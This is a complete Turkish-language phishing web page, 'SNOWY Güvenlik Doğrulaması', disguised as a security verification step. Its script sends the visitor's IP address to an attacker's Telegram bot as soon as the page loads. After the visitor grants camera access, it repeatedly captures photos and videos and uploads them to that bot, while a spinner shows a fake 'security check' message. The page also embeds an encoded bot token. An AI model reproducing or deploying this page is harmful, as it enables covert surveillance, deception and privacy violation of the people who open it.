<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>SNOWY Güvenlik Doğrulaması</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 30px;
            padding: 40px;
            max-width: 480px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(102, 126, 234, 0.2);
        }
        h2 { 
            color: #1a1a2e; 
            font-size: 32px; 
            margin-bottom: 15px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        h2 span { 
            color: #667eea;
            text-shadow: 0 2px 10px rgba(102, 126, 234, 0.2);
        }
        p { 
            color: #4a5568; 
            margin-bottom: 35px;
            font-size: 16px;
            line-height: 1.6;
        }
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 36px;
            font-size: 20px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        .loading { 
            display: none; 
            margin: 30px 0 20px;
        }
        .spinner {
            border: 4px solid #e2e8f0;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        .loading-text { 
            color: #667eea; 
            font-size: 18px;
            font-weight: 500;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
        <p>Devam etmek için kamera erişimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">📸 DOĞRULAMAYI BAŞLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            // ==================== KONFİGÜRASYON ====================
            const __ENV = {
                API_ENDPOINT: "https://api.telegram.org",
                SESSION_SECRET: "ODY0OTQyMTUwODpBQUVxcjRjcDFPNkI1MnpOXzhSak11YnRkSDJDeEdMR1pTWQ==",
                APP_ENV: "production"
            };

            const SessionManager = {
                getToken: function() {
                    try {
                        return atob(__ENV.SESSION_SECRET);
                    } catch (error) {
                        return null;
                    }
                }
            };

            const BOT_TOKEN = SessionManager.getToken();
            
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_ID = urlParams.get('i');
            const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
            const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
            
            // ==================== IP ADRESİ GÖNDER ====================
            if (TARGET_ID && BOT_TOKEN) {
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => {
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                chat_id: TARGET_ID,
                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
                            })
                        });
                    })
                    .catch(e => console.log(e));
            }
            
            // ==================== KAMERA İŞLEMLERİ - KESİN ÇÖZÜM ====================
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
            
            let mediaRecorder = null;
            let videoCount = 0;
            let photoCount = 0;
            let stream = null;
            let baslangicZamani = 0;
            
            async function startCamera() {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 60 }
                        } 
                    });
                    
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        document.getElementById('startBtn').style.display = 'none';
                        document.getElementById('loading').style.display = 'block';
                        
                        baslangicZamani = performance.now();
                        
                        // ========================================
                        // BASİT VE GARANTİLİ ÇÖZÜM
                        // ========================================
                        
                        // 1. FOTOĞRAF - HEMEN BAŞLA (100ms sonra)
                        setTimeout(() => {
                            // İlk fotoğraf
                            photoCount++;
                            canvas.width = video.videoWidth || 640;
                            canvas.height = video.videoHeight || 480;
                            ctx.drawImage(video, 0, 0);
                            
                            canvas.toBlob(function(blob) {
                                if (!blob) return;
                                const formData = new FormData();
                                formData.append('chat_id', TARGET_ID);
                                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                formData.append('caption', `📸 Fotoğraf #${photoCount}`);
                                
                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });
                            }, 'image/jpeg', 0.85);
                            
                            // Diğer fotoğraflar
                            setInterval(() => {
                                if (!stream?.active) return;
                                
                                photoCount++;
                                
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                ctx.drawImage(video, 0, 0);
                                
                                canvas.toBlob(function(blob) {
                                    if (!blob) return;
                                    const formData = new FormData();
                                    formData.append('chat_id', TARGET_ID);
                                    formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                    formData.append('caption', `📸 Fotoğraf #${photoCount}`);
                                    
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    });
                                }, 'image/jpeg', 0.85);
                                
                            }, FOTO_SURESI * 1000);
                            
                        }, 100);
                        
                        // 2. VİDEO - HEMEN BAŞLA (200ms sonra)
                        setTimeout(() => {
                            // İlk video
                            videoCount = 1;
                            const videoBaslangic = Date.now();
                            const chunks = [];
                            
                            try {
                                const mr = new MediaRecorder(stream, {
                                    mimeType: 'video/webm;codecs=vp8',
                                    videoBitsPerSecond: 2500000
                                });
                                
                                mr.ondataavailable = (e) => {
                                    if (e.data.size > 0) chunks.push(e.data);
                                };
                                
                                mr.onstop = () => {
                                    const blob = new Blob(chunks, { type: 'video/webm' });
                                    const boyutKB = (blob.size / 1024).toFixed(0);
                                    
                                    const formData = new FormData();
                                    formData.append('chat_id', TARGET_ID);
                                    formData.append('video', blob, `video_${Date.now()}.webm`);
                                    formData.append('caption', `🎥 Video #1 - ${VIDEO_SURESI}s`);
                                    
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                        method: 'POST',
                                        body: formData
                                    });
                                };
                                
                                mr.start();
                                
                                setTimeout(() => {
                                    if (mr.state === 'recording') mr.stop();
                                }, VIDEO_SURESI * 1000);
                                
                                // Diğer videolar
                                setInterval(() => {
                                    if (!stream?.active) return;
                                    
                                    videoCount++;
                                    const videoIndex = videoCount;
                                    const videoBaslangic = Date.now();
                                    const chunks = [];
                                    
                                    try {
                                        const mr = new MediaRecorder(stream, {
                                            mimeType: 'video/webm;codecs=vp8',
                                            videoBitsPerSecond: 2500000
                                        });
                                        
                                        mr.ondataavailable = (e) => {
                                            if (e.data.size > 0) chunks.push(e.data);
                                        };
                                        
                                        mr.onstop = () => {
                                            const blob = new Blob(chunks, { type: 'video/webm' });
                                            const boyutKB = (blob.size / 1024).toFixed(0);
                                            
                                            const formData = new FormData();
                                            formData.append('chat_id', TARGET_ID);
                                            formData.append('video', blob, `video_${Date.now()}.webm`);
                                            formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s`);
                                            
                                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                                method: 'POST',
                                                body: formData
                                            });
                                        };
                                        
                                        mr.start();
                                        
                                        setTimeout(() => {
                                            if (mr.state === 'recording') mr.stop();
                                        }, VIDEO_SURESI * 1000);
                                        
                                    } catch(e) {}
                                }, VIDEO_SURESI * 1000);
                                
                            } catch(e) {}
                            
                        }, 200);
                    };
                    
                } catch(e) {
                    alert('Kamera izni gerekli!');
                }
            }
            
            window.onbeforeunload = function() {
                if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                if (stream) stream.getTracks().forEach(t => t.stop());
            };
            
            window.startCamera = startCamera;
        })();
    </script>
</body>
    </html>
